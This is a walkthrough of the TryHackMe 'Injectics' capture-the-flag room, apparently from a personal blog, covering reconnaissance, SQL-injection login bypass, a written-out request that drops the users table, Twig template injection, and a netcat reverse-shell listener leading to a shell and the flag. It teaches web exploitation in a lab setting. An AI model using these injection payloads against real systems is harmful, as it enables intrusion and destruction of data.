---
title: "TryHackMe - Injectics"
date: 2025-05-21 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [SSTI, Twig, reverse shell, burpsuite, web exploitation,  ]
---




Can you utilise your web pen-testing skills to safeguard the event from any injection attack?

## Reconnaissance

As always, I began by conducting a full port scan using `nmap` to enumerate the exposed services and identify potential attack surfaces.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- -A 10.10.125.71 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 07:30 EDT
Nmap scan report for 10.10.125.71
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:27:ea:88:58:09:c4:75:7b:b9:f2:24:c7:92:92:3b (RSA)
|   256 fd:8b:e7:07:5d:17:2f:8d:e4:42:1d:75:40:d5:d3:97 (ECDSA)
|_  256 52:2e:f1:67:77:f4:11:48:7c:53:ce:9e:97:f4:ff:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   64.37 ms 10.23.0.1
2   64.39 ms 10.10.125.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.86 seconds
```

The results showed two open ports:

- **22/tcp** – SSH running OpenSSH 8.2p1 on Ubuntu

- **80/tcp** – Web server running Apache 2.4.41 (Ubuntu)



Navigating to the web application on port 80 and checked the page source. I discovered an interesting developer comment:

![1](/images/injectics/1.png)

This was a valuable clue, indicating potential access to sensitive internal logs.


## Directory Bruteforcing

To identify hidden resources and unprotected files, I ran **dirsearch**:

```console
                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ dirsearch -u http://10.10.125.71                            
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                  
 (_||| _) (/_(_|| (_| )                                                                           
                                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/http_10.10.125.71/_25-05-28_07-37-49.txt

Target: http://10.10.125.71/

[07:37:49] Starting:                                                                              
[07:37:53] 301 -  309B  - /js  ->  http://10.10.125.71/js/                  
[07:37:54] 403 -  277B  - /.ht_wsr.txt                                      
[07:37:54] 403 -  277B  - /.htaccess.bak1                                   
[07:37:54] 403 -  277B  - /.htaccess.orig                                   
[07:37:54] 403 -  277B  - /.htaccess.sample                                 
[07:37:54] 403 -  277B  - /.htaccess.save
[07:37:54] 403 -  277B  - /.htaccess_extra                                  
[07:37:54] 403 -  277B  - /.htaccess_orig
[07:37:54] 403 -  277B  - /.htaccess_sc
[07:37:54] 403 -  277B  - /.htaccessOLD
[07:37:54] 403 -  277B  - /.htaccessOLD2
[07:37:54] 403 -  277B  - /.htaccessBAK
[07:37:54] 403 -  277B  - /.htm                                             
[07:37:54] 403 -  277B  - /.html                                            
[07:37:54] 403 -  277B  - /.htpasswd_test                                   
[07:37:54] 403 -  277B  - /.htpasswds
[07:37:54] 403 -  277B  - /.httr-oauth
[07:37:55] 403 -  277B  - /.php                                             
[07:38:13] 200 -   48B  - /composer.json                                    
[07:38:13] 200 -    9KB - /composer.lock                                    
[07:38:15] 301 -  310B  - /css  ->  http://10.10.125.71/css/                
[07:38:15] 302 -    0B  - /dashboard.php  ->  dashboard.php                 
[07:38:19] 301 -  312B  - /flags  ->  http://10.10.125.71/flags/            
[07:38:23] 301 -  317B  - /javascript  ->  http://10.10.125.71/javascript/  
[07:38:24] 403 -  277B  - /js/                                              
[07:38:26] 200 -    1KB - /login.php                                        
[07:38:26] 302 -    0B  - /logout.php  ->  index.php                        
[07:38:26] 200 -    1KB - /mail.log                                         
[07:38:32] 301 -  317B  - /phpmyadmin  ->  http://10.10.125.71/phpmyadmin/  
[07:38:33] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[07:38:33] 200 -    3KB - /phpmyadmin/                                      
[07:38:33] 200 -    3KB - /phpmyadmin/index.php                             
[07:38:38] 403 -  277B  - /server-status                                    
[07:38:38] 403 -  277B  - /server-status/                                   
[07:38:46] 403 -  277B  - /vendor/                                          
[07:38:46] 200 -    0B  - /vendor/composer/autoload_classmap.php            
[07:38:46] 200 -    0B  - /vendor/composer/autoload_files.php               
[07:38:46] 200 -    0B  - /vendor/composer/autoload_real.php
[07:38:46] 200 -    0B  - /vendor/composer/ClassLoader.php                  
[07:38:46] 200 -    0B  - /vendor/composer/autoload_static.php
[07:38:46] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[07:38:46] 200 -    1KB - /vendor/composer/LICENSE
[07:38:46] 200 -    0B  - /vendor/composer/autoload_psr4.php
[07:38:46] 200 -   12KB - /vendor/composer/installed.json                   
[07:38:46] 200 -    0B  - /vendor/autoload.php                              
                                                                             
Task Completed                                                                             
```

Among many 403 responses, a few interesting files were publicly accessible:

- `/mail.log` – Email log file mentioned in the source code

- `/phpmyadmin/` – Exposed phpMyAdmin interface

- `/login.php` and `/dashboard.php` – Login and user dashboard pages


Accessing `/mail.log`, I found an internal email between developers:


```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```

I attempted to log in via `/login.php`, `/adminLogin007.php`, and `/phpmyadmin/`, but none accepted the default credentials. It was time to look for a SQL Injection (SQLi) vulnerability.

## SQL Injection


To test for authentication bypass via SQL Injection, I utilized payloads from the well-known [PayloadsAllTheThings repository on GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt). This resource had proven useful in previous challenges, such as [TryHackMe - Light](https://malinovvski.github.io/posts/tryhackme-light/). This time, I specifically employed both `Auth_Bypass.txt` and `Auth_Bypass2.txt` payload lists.


For the injection attempts, I used **Burp Suite** in combination with its Intruder tool. I configured the attack by loading the payload list into the relevant injection point and initiated the automated testing process to evaluate for SQLi-based authentication bypass.

![2](/images/injectics/2.jpg)

![3](/images/injectics/3.jpg)


![4](/images/injectics/4.jpg)



After the attack is completed, I successfully bypassed authentication and accessed the `Developer Dashboard`.

![5](/images/injectics/5.jpg)


## Exploiting SQLi to delete **users** table

To trigger the background service and restore the default credentials, I needed to delete the `users` table. I identified a vulnerable form in the `Edit Leaderboard` functionality and crafted the following payload by using Burp:


```console
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.125.71
Content-Length: 46
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.125.71
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.125.71/edit_leaderboard.php?rank=1&country=USA
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jp6mvabofl6q50bh1d4evq604t
Connection: keep-alive

rank=1&country=&gold=22; drop table -- -&silver=21&bronze=12345
```

By injecting `; drop table users -- -` , I executed an out-of-band SQL command that dropped the users table. 

> The semicolon (`;`) terminates the original query, and `-- -` comments out the rest.

![6](/images/injectics/6.jpg)

After a minute, I retried logging in using the default credentials from the email:

```
Email: superadmin@injectics.thm
Password: superSecurePasswd101
```

![7](/images/injectics/7.jpg)


This time, I was granted `Admin Dashboard` access — along with the first flag.

![8](/images/injectics/8.jpg)

## Server-Side Template Injection(SSTI)

While analyzing the application, I suspected that the server might be vulnerable to **Server-Side Template Injection (SSTI)**, potentially through the **Twig** templating engine—a common component in PHP-based applications, as described in [this TryHackMe room](https://tryhackme.com/room/serversidetemplateinjection). I confirmed this by testing a basic expression payload:

![9](/images/injectics/9.jpg)
![10](/images/injectics/10.jpg)

The application responded with 4, confirming execution. Based on this, I crafted a more complex Twig SSTI payload to achieve a reverse shell.

## Reverse Shell via Twig

Using knowledge from the [PayloadsAllTheThings Twig section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig---basic-injection), as well as insights provided by ChatGPT, I crafted the following payload to trigger a Bash reverse shell via Twig template injection:

![reverseshell](/images/injectics/basherror.jpg)

On my machine, I set up a listener:

```console
nc -lvnp PORT
```

After injecting the payload, I received a shell as the `www-data` user. Once inside, I navigated through the directories and was able to retrieve the second hidden flag.

```console
www-data@injectics:/var/www/html$ ls -lah
ls -lah
total 548K
drwxr-xr-x 6 ubuntu ubuntu 4.0K Jul 31  2024 .
drwxr-xr-x 3 root   root   4.0K Jul 19  2024 ..
-rw-rw-r-- 1 ubuntu ubuntu 1.0K Jul 31  2024 .conn.php.swp
-rw-r--r-- 1 ubuntu ubuntu  121 Jul 31  2024 .htaccess
-rw-rw-r-- 1 ubuntu ubuntu 7.2K Jul 23  2024 adminLogin007.php
-rw-r--r-- 1 ubuntu ubuntu 423K Jul 18  2024 banner.jpg
-rw-r--r-- 1 ubuntu ubuntu   48 Jul 17  2024 composer.json
-rw-r--r-- 1 ubuntu ubuntu 8.6K Jul 17  2024 composer.lock
-rw-r--r-- 1 ubuntu ubuntu 2.8K Jul 31  2024 conn.php
drwxrwxr-x 2 ubuntu ubuntu 4.0K Jul 18  2024 css
-rw-r--r-- 1 ubuntu ubuntu 7.4K Jul 23  2024 dashboard.php
-rw-rw-r-- 1 ubuntu ubuntu 7.1K Jul 23  2024 edit_leaderboard.php
drwxrwxr-x 2 ubuntu ubuntu 4.0K Jul 18  2024 flags
-rw-r--r-- 1 ubuntu ubuntu 2.1K Jul 22  2024 functions.php
-rw-r--r-- 1 ubuntu ubuntu 6.0K Jul 23  2024 index.php
-rwxrwxr-x 1 ubuntu ubuntu 3.9K Jul 23  2024 injecticsService.php
drwxrwxr-x 2 ubuntu ubuntu 4.0K Jul 18  2024 js
-rw-r--r-- 1 ubuntu ubuntu 5.5K Jul 23  2024 login.php
-rw-r--r-- 1 ubuntu ubuntu   99 Jun 16  2024 logout.php
-rw-rw-r-- 1 ubuntu ubuntu 1.1K Jul 23  2024 mail.log
-rw-r--r-- 1 ubuntu ubuntu 1.1K Jul 23  2024 script.js
-rw-r--r-- 1 ubuntu ubuntu 1.4K May 16  2023 styles.css
-rw-rw-r-- 1 ubuntu ubuntu 6.7K Jul 23  2024 update_profile.php
drwxr-xr-x 6 ubuntu ubuntu 4.0K Jul 17  2024 vendor
www-data@injectics:/var/www/html$ cat flags
cat flags
cat: flags: Is a directory
www-data@injectics:/var/www/html$ cd flags
cd flags
www-data@injectics:/var/www/html/flags$ ls
ls
5d8af1dc14503c7e4bdc8e51a3469f48.txt
www-data@injectics:/var/www/html/flags$ cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
<tml/flags$ cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
THM{5735172b6c147f4dd649872f73e0fdea}
www-data@injectics:/var/www/html/flags$ 
```